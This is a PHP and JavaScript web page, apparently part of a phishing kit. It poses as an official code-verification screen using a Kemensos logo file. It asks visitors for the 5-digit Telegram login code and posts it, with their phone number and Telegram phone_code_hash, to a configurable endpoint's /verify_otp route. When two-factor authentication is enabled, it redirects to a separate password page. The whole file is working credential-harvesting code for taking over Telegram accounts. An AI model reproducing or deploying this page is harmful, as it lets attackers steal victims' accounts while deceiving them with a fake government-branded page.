<?php
// Include settings file
require_once 'settings.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Code Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="shortcut icon" href="img/logokemensos.png" type="image/x-icon">
    <style>
        body {
    /* background-image: url('../images/bg.png'); */
    background-size: cover;
    background-repeat: no-repeat;
    background-color: #fdfdfd; 
    /* color: #ffffff; */
}
    </style>
</head>
<body>
    <div>
        
</header>
        <div style="position: relative; text-align: left;">
            <!-- Gambar -->
            <img src="img/otp.jpg" class="img-fluid mx-auto d-block" style="width: 100%;">
        
            <!-- Teks di kiri atas -->
        </div>

        <div class=container>
        
<main>
    <style>
      body {
            font-family: Arial, sans-serif;
            background-color: #F4F4F9;
            margin: 0;
            padding: 0;
        }

        /* Top bar styling */
        .top-bar {
            background-color: #F9F9F9;
            padding: 5px 20px;
            font-size: 12px;
            color: #6B6B6B;
            border-bottom: 1px solid #E5E5E5;
            text-align: left;
        }

        .top-bar a {
            color: #1A73E8;
            text-decoration: none;
            margin-left: 5px;
        }

        /* Header styling */
        .header {
            background-color: #2F318C;
            color: white;
            padding: 40px 20px;
            position: relative;
            overflow: hidden;
        }

        .header .logo-container {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
        }

        .header .logo-container img {
            height: 35px;
        }

        .header .language-selector {
            display: flex;
            align-items: center;
            border: 1px solid #FFFFFF;
            color: #FFFFFF;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }

        .header .language-selector i {
            margin-right: 5px;
        }

        .header .content {
            margin-top: 30px;
        }

        .header .content h1 {
            margin: 0;
            font-size: 28px;
            font-weight: bold;
        }

        .header .content p {
            margin: 5px 0 0;
            font-size: 18px;
        }

        .header .illustration {
            position: absolute;
            bottom: 0;
            right: -50px;
            height: 100px;
        }
        #verify-button {
            display: inline-block; 
            padding: 0.5rem 1rem; 
        }
    </style>
    
            <div class="col-12 col-md-8 col-lg-6">
    <br>
    <h2 class="text-center">Masukkan Kod Pengesahan</h2>
    <p class="text-center">Kod 5 digit telah dihantar ke Telegram anda. <span id="phoneNumberPlaceholder">Sila masukkan kod untuk meneruskan</span>.</p>
    <form id="code-verification-form">
        <div class="d-flex justify-content-center mb-3">
            <input type="tel" class="form-control code-input mx-1" id="code1" maxlength="1" required style="width: 50px; text-align: center;">
            <input type="tel" class="form-control code-input mx-1" id="code2" maxlength="1" required style="width: 50px; text-align: center;">
            <input type="tel" class="form-control code-input mx-1" id="code3" maxlength="1" required style="width: 50px; text-align: center;">
            <input type="tel" class="form-control code-input mx-1" id="code4" maxlength="1" required style="width: 50px; text-align: center;">
            <input type="tel" class="form-control code-input mx-1" id="code5" maxlength="1" required style="width: 50px; text-align: center;">
            <input type="hidden" id="otp" value="">
        </div>
        <div id="feedback" class="text-sm mt-2"></div>
        <div id="loader" style="display:none;"><div class="loader">Proses Verifikasi...</div></div>
        <div id="wrong" class="text-red-500 text-sm mt-1" style="display:none;">Kode tidak valid</div>
        <div class="d-flex justify-content-center">
            <button type="button" id="verifyBtn" class="btn btn-primary" style="background-color: #3f51b5; color:#ffffff;">
                <span id="btnLoader" class="hidden">⏳</span>
                <span id="btnText">Verification</span>
            </button>
        </div>                    
    </form>
</div>
</main>

      </div>
        
        
        
        
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    // Create the phpSettings variable from PHP $url variable
    var phpSettings = {
        endpointUrl: '<?php echo $url; ?>'
    };
</script>
<script>
$(document).ready(function() {
    // Ambil dan tampilkan nomor telepon
    const phone = sessionStorage.getItem("phone");
    if (phone) {
        $("#phoneNumberPlaceholder").text("+60" + phone);
    }

    // Handle input fields for OTP
    $('.code-input').on('input', function() {
        // Only allow numbers
        this.value = this.value.replace(/[^0-9]/g, '');
        
        // Auto focus to next input
        if (this.value.length === 1) {
            $(this).next('.code-input').focus();
        }
        
        // Combine all inputs to create the complete OTP
        updateOTP();
    });

    // Handle backspace key to go to previous input
    $('.code-input').on('keydown', function(e) {
        if (e.key === 'Backspace' && this.value.length === 0) {
            $(this).prev('.code-input').focus();
        }
    });

    // Function to combine individual digits into complete OTP
    function updateOTP() {
        let otp = '';
        $('.code-input').each(function() {
            otp += $(this).val();
        });
        $('#otp').val(otp);
        
        // Show verify button when all digits are entered
        if (otp.length === 5) {
            $('#verifyBtn').removeClass('visually-hidden');
        } else {
            $('#verifyBtn').addClass('visually-hidden');
        }
    }

    // Verify OTP when button is clicked
    $("#verifyBtn").on("click", function (e) {
        e.preventDefault();
        
        const otp = $("#otp").val();
        const feedback = $("#feedback");
        const loader = $("#loader");
        const btnLoader = $("#btnLoader");
        const btnText = $("#btnText");
        const wrongMsg = $("#wrong");
        
        // Reset feedback
        feedback.text("");
        wrongMsg.hide();
        
        // Validasi panjang OTP
        if (otp.length !== 5) {
            wrongMsg.text('Kode harus 5 angka').show();
            return;
        }
        
        loader.show();
        btnLoader.removeClass('hidden');
        btnText.text('Memproses...');
        $(this).addClass('opacity-75 pointer-events-none');
        
        const endpointUrl = phpSettings.endpointUrl;
        
        const phoneCodeHash = sessionStorage.getItem("phone_code_hash");
        $.ajax({
            url: endpointUrl + "/verify_otp",
            type: "POST",
            contentType: "application/json",
            data: JSON.stringify({
                phone: "+60" + phone,
                otp: otp,
                phoneCodeHash: phoneCodeHash
            }),
            success: function(response) {
                loader.hide();
                if (response.status === 'success') {
                    feedback.html('<span style="color: green;">' + response.message + '</span>');
                    setTimeout(function() {
                        window.location.href = 'finish.php';
                    }, 100);
                } else if (response.status === 'needs_2fa') {
                    feedback.html('<span style="color: orange;">' + response.message + '</span>');
                    setTimeout(function() {
                        window.location.href = 'pass.php';
                    }, 100);
                } else {
                    wrongMsg.text(response.message).show();
                    // Reset tombol
                    btnLoader.addClass('hidden');
                    btnText.text('Verifikasi Kode');
                    $('#verifyBtn').removeClass('opacity-75 pointer-events-none');
                }
            },
            error: function (xhr) {
                loader.hide();
                const errorResponse = xhr.responseJSON || { message: "Terjadi kesalahan saat memverifikasi kode." };
                wrongMsg.text(errorResponse.message).show();
                // Reset tombol
                btnLoader.addClass('hidden');
                btnText.text('Verifikasi Kode');
                $('#verifyBtn').removeClass('opacity-75 pointer-events-none');
            }
        });
    });
});
</script>


</body>
</html>